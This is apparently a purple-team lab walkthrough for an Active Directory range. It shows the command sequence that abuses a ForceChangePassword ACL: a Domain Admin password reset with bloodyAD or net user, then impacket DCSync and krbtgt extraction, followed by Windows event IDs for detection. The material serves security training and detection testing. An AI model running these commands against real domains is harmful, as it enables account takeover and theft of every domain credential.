# WT#015 — ACL ForceChangePassword

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01) |
| **Domain** | cadre.local |
| **Starting Credential** | hunter_dfir / DF1R_Hunt3r! |
| **Tools Required** | net (native), bloodyAD |
| **Certifications** | CRTP, OSCP+ |
| **MITRE ATT&CK** | T1098 |
| **Difficulty** | Easy |

## Prerequisites
- hunter_dfir has ForceChangePassword (User-Force-Change-Password extended right) on chief_command user
- chief_command is a member of Domain Admins + Enterprise Admins

## Attack Steps

### Step 1 — Verify the ACL
```bash
# From kali, verify hunter_dfir has ForceChangePassword on chief_command
bloodyAD --host dc01.cadre.local -d cadre.local -u hunter_dfir -p 'DF1R_Hunt3r!' get aces 'CN=chief_command,OU=Command,DC=cadre,DC=local'

# Expected: hunter_dfir has ExtendedRight with GUID 00299570-246d-11d0-a768-00aa006e0529 (Reset Password)
```

### Step 2 — Reset chief_command password
```bash
# Method A: net user (from any Windows machine joined to cadre.local)
# Requires access to a Windows domain-joined machine
net user chief_command C0mm@nd_Ch1ef!_New! /domain

# Method B: bloodyAD from kali
bloodyAD --host dc01.cadre.local -d cadre.local -u hunter_dfir -p 'DF1R_Hunt3r!' set password 'CN=chief_command,OU=Command,DC=cadre,DC=local' 'C0mm@nd_Ch1ef!_New!'
```

### Step 3 — Authenticate as chief_command (DA)
```bash
# Verify new password works — attempt DCSync as chief_command
impacket-secretsdump 'cadre.local/chief_command:C0mm@nd_Ch1ef!_New!'@192.168.77.10 -just-dc

# Or get a TGT
impacket-getTGT 'cadre.local/chief_command:C0mm@nd_Ch1ef!_New!' -dc-ip 192.168.77.10
```

### Step 4 — Full domain compromise
```bash
# DCSync all domain hashes
impacket-secretsdump 'cadre.local/chief_command:C0mm@nd_Ch1ef!_New!'@192.168.77.10

# Extract krbtgt for Golden Ticket
impacket-secretsdump 'cadre.local/chief_command:C0mm@nd_Ch1ef!_New!'@192.168.77.10 -just-dc-user 'cadre\krbtgt'
```

## Post-Exploitation Chain
WT#015 → chief_command password reset → DA → DCSync → Golden Ticket → full forest compromise → AdminSDHolder persistence (WT#025)

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`
- **Expected Events:**
  - Event ID 4724: Password reset attempt — critical indicator!
  - Event ID 4738: User account changed (pwdLastSet attribute)
  - Event ID 4624: Successful logon as chief_command
  - Event ID 4672: Special privileges assigned to new logon
  - Event ID 4662: Audit of Reset Password right (if SACL configured)
- **Zeek:** `kerberos.log` showing TGT request as chief_command after password change
- **Detection:** Password resets (4724) on privileged accounts (Domain Admins) are high-severity alerts. This attack produces the most clear-cut detection signal of all ACL attacks.

## Status
CONFIGURED
